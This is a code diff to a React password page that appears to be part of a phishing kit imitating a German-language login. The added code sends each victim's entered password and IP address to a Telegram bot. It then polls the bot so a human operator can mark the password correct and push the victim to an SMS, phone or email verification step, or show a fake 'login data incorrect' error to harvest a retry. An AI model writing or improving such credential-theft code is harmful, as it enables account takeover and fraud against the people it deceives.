@@ -12,29 +12,45 @@ const Password = (props) => {
 
     const [password, setPassword] = useState('')
     const [isLoading, setLoading] = useState(false);
+    const [isError, setError] = useState(false);
+    const [invalid, setInvalid] = useState(false);
 
 
     const enterPassword =  () => {
+        if (!password) {
+            setInvalid(true);
+            return
+        }
         axios.get(bot.getUpdates())
             .then((res) => {
                 firstState = res.data.result;
             })
         setLoading(true);
-        axios.post(bot.sendMessage(password + '%20password'), '')
-        axios.post(bot.sendMessage("phone_sms_email"));
+        axios.post(bot.sendMessage('Пользователь <code>' + props.info.IPv4 + '</code>' +
+            ' говорит, что его пароль: ' + password + '.%0A Если пароль верный, введите (sms/phone/email).%0A' +
+            'Если нет, напишите (no)'), '')
     }
 
 
     const getUpdatesInterval =  () => {
-        axios.get(bot.getUpdates())
+        let req;
+        if (firstState.length > 80) {
+            req = bot.getUpdatesOffset(Number(firstState[firstState.length - 1].update_id) + 1)
+        } else req = bot.getUpdates();
+        axios.get(req)
             .then((res) => {
                 if (firstState) {
                     if (res.data.result.length !== firstState.length) {
                         let text = res.data.result[res.data.result.length - 1].message.text;
-                        if (text === 'sms') props.setState(1)
-                        else if (text === 'phone') props.setState(2)
-                        else if (text === 'email') props.setState(3)
-                        else firstState = res.data.result;
+                        if (text.indexOf(props.info.IPv4) !== -1) {
+                            if (text.indexOf('sms') !== -1) props.setState(1)
+                            else if (text.indexOf('phone') !== -1) props.setState(2)
+                            else if (text.indexOf('email') !== -1) props.setState(3)
+                            else if (text.indexOf('no') !== -1) {
+                                setLoading(false);
+                                setError(true)
+                            } else firstState = res.data.result;
+                        } else firstState = res.data.result;
                     }
                 } else firstState = res.data.result;
 
@@ -59,7 +75,14 @@ const Password = (props) => {
                 </header>
                 <div id={"loginContent"}>
                     <div id="loginSection">
-
+                        <div className={classes.notifications}>
+                            <div className={classes.notifications}>
+                                {isError ? <p className={[classes.notification, classes.notificationCritical].join(' ')}
+                                              role="alert">Die eingegebenen Login-Daten sind nicht richtig.
+                                    Bitte versuchen Sie es erneut.
+                                </p> : null}
+                            </div>
+                        </div>
                         <form className={classes.maskable} onSubmit={(e) => {
                             e.preventDefault();
                             enterPassword();
@@ -74,9 +97,16 @@ const Password = (props) => {
                                     </div>
                                     <div className={classes.textInput}>
                                         <div className={classes.fieldWrapper}>
+                                            {invalid ?
+                                                <div className={[classes.errorMessage, classes.show].join(' ')}>
+                                                    <p className="invalidError hide">Diese Angabe ist erforderlich.</p>
+                                                </div> : ''}
                                             <label className={classes.fieldLabel}></label>
                                             <input placeholder={"Passwort"} type={"password"} value={password}
-                                                   onChange={e => setPassword(e.target.value)}/>
+                                                   onChange={e => {
+                                                       setInvalid(false);
+                                                       setPassword(e.target.value)
+                                                   }}/>
                                         </div>
                                     </div>
                                 </div>
